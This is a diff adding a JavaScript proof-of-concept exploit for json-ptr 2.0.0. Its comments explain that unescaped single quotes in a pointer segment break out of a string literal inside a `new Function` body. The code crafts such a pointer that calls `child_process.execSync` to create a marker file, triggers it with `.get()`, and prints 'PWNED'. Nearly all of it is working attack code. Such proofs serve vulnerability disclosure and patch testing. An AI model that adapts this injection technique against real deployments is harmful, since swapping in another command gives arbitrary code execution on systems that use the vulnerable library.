@@ -1,0 +1,36 @@
+```javascript
+// Exploit for json-ptr 2.0.0 — code injection via compilePointerDereference()
+//
+// util.js builds the body of a `new Function(...)` by concatenating each
+// pointer segment into a JS string literal, escaping only backslashes:
+//
+//   "... typeof((it = it['" + segment.replace(/\\/g, '\\\\') + "'])) ..."
+//
+// Because single quotes are never escaped, a pointer segment containing a
+// single quote breaks out of the string literal and lets arbitrary
+// JavaScript be spliced into the generated function body, which is then
+// compiled with `new Function` and executed as soon as `.get()` is called.
+
+const { JsonPointer } = require("json-ptr");
+
+const marker = "/tmp/json-ptr-pwned-" + Date.now();
+
+// Break out of the string literal inside the generated function body and
+// inject a command execution payload.
+const evilPointer =
+  "/a']; require('child_process').execSync('touch " +
+  marker +
+  "'); ((it) => { if(typeof it !=='undefined'";
+
+const ptr = JsonPointer.create(evilPointer);
+
+// Triggers util_1.compilePointerDereference(this.path) -> new Function(...)
+// -> our injected code executes.
+ptr.get({ a: 1 });
+
+const fs = require("fs");
+console.log(
+  "Arbitrary code executed via json-ptr:",
+  fs.existsSync(marker) ? "PWNED (marker file created)" : "failed"
+);
+```
